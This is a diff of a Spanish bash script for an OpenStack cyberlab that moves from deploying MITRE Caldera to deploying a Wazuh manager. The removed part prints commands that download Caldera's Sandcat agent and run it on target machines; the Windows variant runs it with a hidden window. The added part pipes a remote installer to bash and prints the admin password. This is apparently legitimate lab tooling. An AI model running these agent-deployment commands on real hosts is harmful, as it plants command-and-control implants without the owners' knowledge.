@@ -1,7 +1,7 @@
 #!/bin/bash
 # ==========================================
 #  Descripción: Despliega una instancia
-#  Debian 12 en OpenStack e instala MITRE Caldera
+#  Debian 12 en OpenStack e instala Wazuh
 # ==========================================
 
 # ===== Timer global del script =====
@@ -17,7 +17,7 @@ format_time() {
 
 echo "============================================="
 echo "    Despliega una instancia en OpenStack:    "
-echo "         Debian 12 + MITRE Caldera           "
+echo "           Debian 12 + Wazuh Manager         "
 echo "============================================="
 
 # ===== Activar entorno virtual =====
@@ -59,7 +59,7 @@ SUBNET_PRIVATE="subnet_net_private_01"
 NETWORK_EXTERNAL="net_external_01"
 ROUTER_NAME="router_private_01"
 
-INSTANCE_NAME="caldera-server"
+INSTANCE_NAME="wazuh-manager"
 SSH_USER="debian"
 SSH_KEY_PATH="$HOME/nics-cyberlab-A/my_key.pem"
 USERDATA_FILE="$HOME/nics-cyberlab-A/set-password.yml"
@@ -104,7 +104,7 @@ echo "-------------------------------------------"
 # =========================
 # ELIMINAR INSTANCIA PREVIA
 # =========================
-EXISTING=$(openstack server list -f value -c Name | grep -w "$INSTANCE_NAME")
+EXISTING=$(openstack server list -f value -c Name | grep -w "$INSTANCE_NAME" || true)
 if [[ -n "$EXISTING" ]]; then
     echo "[!] Existe una instancia '$INSTANCE_NAME'. Eliminando..."
     for s in $EXISTING; do openstack server delete "$s"; done
@@ -152,7 +152,7 @@ openstack server add floating ip "$INSTANCE_NAME" "$FLOATING_IP"
 # =========================
 # ESPERA SSH (1 MINUTO)
 # =========================
-echo "[+] Esperando conexión SSH (Puede tardar un momentito)..."
+echo "[+] Esperando conexión SSH (timeout 1 min)..."
 SSH_TIMEOUT=60
 SSH_START=$(date +%s)
 
@@ -170,53 +170,60 @@ done
 echo
 echo "[✔] SSH disponible en $FLOATING_IP"
 
-# ===============================
-# INSTALACIÓN DE CALDERA (TIMER)
-# ===============================
+# ===========================================
+# INSTALACIÓN DE WAZUH MANAGER (CON TIMER)
+# ===========================================
 INSTALL_START=$(date +%s)
 
 ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<'EOF'
 set -e
 
-sudo apt update
-sudo apt upgrade -y
-sudo apt autoremove --purge -y
-sudo apt autoclean -y
+echo "[+] Actualizando el sistema..."
+sudo apt-get update && sudo apt-get upgrade -y
 
-sudo apt install -y python3 python3-pip curl git build-essential
+echo "[+] Instalando dependencias (curl, net-tools)..."
+sudo apt-get install -y curl net-tools
 
-# Node.js 20
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-sudo apt install -y nodejs
+echo "[+] Descargando e instalando Wazuh (wazuh-install.sh -a)..."
+cd "$HOME"
+sudo curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
+sudo bash ./wazuh-install.sh -a
 
-# Clonar Caldera
-cd ~
-git clone https://github.com/mitre/caldera.git --recursive || true
+echo "[+] Extrayendo contraseña del usuario 'admin' de wazuh-passwords.txt..."
+if [ -f wazuh-install-files.tar ]; then
+  sudo tar -axf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt -O \
+    | grep -P "'admin'" -A 1 \
+    | tail -n 1 \
+    | awk -F"'" '{print $2}' \
+    | sudo tee /tmp/wazuh-admin-password >/dev/null || true
+else
+  echo "[!] No se ha encontrado 'wazuh-install-files.tar', no se puede extraer la contraseña automáticamente."
+fi
 
-# Plugin Magma
-cd ~/caldera/plugins/magma
-rm -rf node_modules package-lock.json
-npm install vite@2.9.15 @vitejs/plugin-vue@2.3.4 vue@3.2.45 --legacy-peer-deps
+echo "[+] Comprobando estado del servicio wazuh-manager..."
+sudo systemctl status wazuh-manager.service --no-pager || true
 
-# Requisitos Python
-cd ~/caldera
-sudo pip3 install --break-system-packages -r requirements.txt
+echo "[+] Comprobando que el puerto 1515 está en escucha..."
+sudo netstat -tuln | grep 1515 || echo "[!] puerto 1515 no encontrado en escucha (comprueba manualmente)."
+
 EOF
+
+# Recuperar contraseña admin desde la instancia
+ADMIN_PASSWORD=$(ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" 'sudo cat /tmp/wazuh-admin-password 2>/dev/null || true')
 
 INSTALL_END=$(date +%s)
 INSTALL_TIME=$((INSTALL_END - INSTALL_START))
 
-echo "[✔] Caldera instalado y configurado."
-echo "[⏱] Tiempo de instalación: $(format_time $INSTALL_TIME)"
+if [[ -z "$ADMIN_PASSWORD" ]]; then
+    ADMIN_PASSWORD="<NO_DETECTADA_EN_SCRIPT>"
+    echo "[!] No se ha podido obtener automáticamente la contraseña de 'admin'."
+    echo "    Dentro de la instancia puedes ejecutar:"
+    echo "    sudo tar -O -xvf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt"
+fi
+
+echo "[✔] Wazuh Manager instalado y configurado."
+echo "[⏱] Tiempo de instalación de Wazuh: $(format_time $INSTALL_TIME)"
 echo "[✔] IP flotante asignada: $FLOATING_IP"
-
-echo
-echo "🔹 Iniciando servidor Caldera (se compilará en segundo plano)..."
-
-ssh -o StrictHostKeyChecking=no -i "$SSH_KEY_PATH" $SSH_USER@"$FLOATING_IP" <<EOF
-cd ~/caldera
-nohup python3 server.py --insecure --build > caldera.log 2>&1 &
-EOF
 
 # ========================================
 # TIEMPO TOTAL DEL SCRIPT
@@ -228,66 +235,14 @@ echo "===================================================="
 echo "[⏱] Tiempo TOTAL del script: $(format_time $SCRIPT_TIME)"
 echo "===================================================="
 
-echo "Acceso SSH:"
+echo
+echo "Acceso SSH a la instancia Wazuh Manager:"
 echo "[➜] ssh -i $SSH_KEY_PATH $SSH_USER@$FLOATING_IP"
 echo "-----------------------------------------------"
-
-CALDERA_SERVER_URL="http://$FLOATING_IP:8888"
-
-echo "Caldera disponible en:"
-echo "[🌐] $CALDERA_SERVER_URL"
-echo "[🔑] Credenciales por defecto: admin / admin"
-
 echo
-echo "===================================================="
-echo " COMANDOS PARA DESPLEGAR AGENTES SANDCAT DESDE CALDERA"
-echo "===================================================="
+echo "Acceso al Wazuh Dashboard:"
+echo "  URL      : https://$FLOATING_IP"
+echo "  Usuario  : admin"
+echo "  Password : $ADMIN_PASSWORD"
 echo
-echo "👉 Estos comandos se ejecutan EN CADA MÁQUINA OBJETIVO."
-echo
-
-# --------- Windows (PowerShell) ---------
-cat <<EOWIN
-[ Windows (PowerShell) ]
-
-Copiar y pegar en una consola de PowerShell con privilegios:
-
-\$server = "$CALDERA_SERVER_URL"
-\$url    = "\$server/file/download"
-\$wc     = New-Object System.Net.WebClient
-\$wc.Headers.Add("platform","windows")
-\$wc.Headers.Add("file","sandcat.go")
-\$data   = \$wc.DownloadData(\$url)
-\$path   = "C:\\Users\\Public\\caldera-agent.exe"
-
-# Guardar el agente y lanzarlo en segundo plano
-[io.file]::WriteAllBytes(\$path, \$data) | Out-Null
-Start-Process -FilePath \$path -ArgumentList "-server \$server -group red -v" -WindowStyle hidden
-
-EOWIN
-
-# --------- Ubuntu ---------
-cat <<EOUBU
-[ Ubuntu (bash) ]
-
-Copiar y pegar en la máquina Ubuntu:
-
-server="$CALDERA_SERVER_URL"
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "\$server/file/download" -o caldera-agent
-chmod +x caldera-agent
-./caldera-agent -server "\$server" -group red -v
-
-EOUBU
-
-# --------- Debian ---------
-cat <<EODEB
-[ Debian (bash) ]
-
-Copiar y pegar en la máquina Debian:
-
-server="$CALDERA_SERVER_URL"
-curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "\$server/file/download" -o caldera-agent
-chmod +x caldera-agent
-./caldera-agent -server "\$server" -group red -v
-
-EODEB
+echo "Recuerda que el acceso es vía HTTPS y el certificado será autofirmado (tendrás que aceptar la excepción en el navegador)."
